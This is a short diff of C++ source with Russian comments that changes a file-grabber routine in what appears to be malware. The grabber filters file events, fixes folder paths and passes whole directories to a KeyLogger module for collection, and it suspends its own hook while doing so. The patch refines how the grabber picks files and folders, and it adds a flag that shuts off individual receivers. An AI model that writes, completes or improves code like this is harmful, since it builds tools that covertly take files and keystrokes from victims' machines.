@@ -186,7 +186,7 @@ void SendEvent( ParamEvent& e )
 	for( int i = 0; i < count; i++ )
 	{
 		Receiver* rv = (Receiver*)List::GetItem( receivers, i );
-		if( e.access & rv->access ) //тип доступа
+		if( !rv->ignore && e.access & rv->access ) //тип доступа
 		{
 			int send = 0; //слать событие (>0) или нет (=0)
 			int extFilter = FilterExt( e, rv );
@@ -302,14 +302,20 @@ void SendEvent( ParamEvent& e )
 						pPathRemoveFileSpecA(e.fileName);
 						//добавляем в конце слеш, так функция PathRemoveFileSpec его убирает
 						int sz = m_lstrlen(e.fileName);
-						e.fileName[sz] = '\\';
-						e.fileName[sz + 1] = 0;
+						if( e.fileName[sz - 1] != '\\' )
+						{
+							e.fileName[sz] = '\\';
+							e.fileName[sz + 1] = 0;
+							sz++;
+						}
 						DBG( "FileGrabber", "Отправляем папку '%s' под именем '%s'", e.fileName, e.nameSend );
 						int currState = stateGrabber;
 						stateGrabber |= IGNOREHOOK; //отключаем граббер
 						KeyLogger::AddDirectory( e.fileName, e.nameSend );
 						stateGrabber = currState; //восстанавливаем состояние
 					}
+				if( res & STOPRECEIVER )
+					rv->ignore = true;
 				if( e.fileName != e.fileNameA ) //освобождаем память, если была перекодировка
 					STR::Free(e.fileName);
 			}
